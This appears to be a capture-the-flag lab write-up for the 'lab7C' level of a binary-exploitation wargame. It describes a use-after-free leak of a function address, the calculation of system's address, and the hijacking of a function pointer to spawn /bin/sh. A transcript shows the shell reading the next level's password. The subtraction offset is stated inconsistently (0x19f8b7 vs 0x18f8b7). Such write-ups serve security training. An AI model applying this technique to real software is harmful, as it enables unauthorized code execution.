@@ -1,0 +1,151 @@
+Attack description:
+
+there are 2 phases to the attack.
+
+1) the first is the ability to leak address of system using use-after-free.
+
+the num member of the number struct is allocated 2 ptrs from the beginning of the struct.
+
+so is the print member of the data struct for storing strings.
+
+if we allocate a number, free it, allocate a data struct, and print the (freed) number's num, the program will print the address of the big_ or small_str function (depending on whether the provided string is longer or shorter than 10 chars).
+
+using gdb we can calculate the offset of small_str from system. small_str's address is randomized, but in my trials, system was always 0x19f8b7 behind small_str.
+
+so all we have to do is perform the leak using the steps outlined above, and then subtract 0x18f8b7 to get the address of system.
+
+2) phase two: calling system with cat or /bin/sh.
+
+using the same overlapping allocation pattern that is leveraged to leak the address of small_str, we can perform phase 1 in reverse (allocate string->store an argument, free it, allocate number->provide an address, print string) to call an arbitrary function. And, because the argument provided to the function will be the string's buffer (that was just initialized) we can easily provide any argument we want to the arbitrary function.
+
+transcript of attack:
+
+
+lab7C@warzone:/levels/lab07$ ./lab7C
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 2
+Input number to store: 4242
+Created new number!
+
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 4
+Deleted most recent number!
+
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 1
+Input string to store: blah
+Created new string!
+
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 6
+Number index to print: 1
+not 1337 enough: 3077692359
+
+/* in another window: calc address of system using offset from
+small str discovered earlier in gdb */
+
+print(3077692359 - 0x19f8b7)
+3075990288
+
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 3
+Deleted most recent string!
+
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 1
+Input string to store: //bin/sh
+Created new string!
+
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 3
+Deleted most recent string!
+
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 2
+Input number to store: 3075990288
+Created new number!
+
+-- UAF Playground Menu ----------------------
+1. Make a string
+2. Make a number
+3. Delete a string
+4. Delete a number
+5. Print a string
+6. Print a number
+7. Quit
+---------------------------------------------
+Enter Choice: 5
+String index to print: 1
+$ cat .pass
+cat: .pass: No such file or directory
+$ ls
+lab7A  lab7A.c  lab7A.readme  lab7C  lab7C.c
+$ cd .
+$ ls
+lab7A  lab7A.c  lab7A.readme  lab7C  lab7C.c
+$ cat /home/lab7A/.pass
+us3_4ft3r_fr33s_4re_s1ck
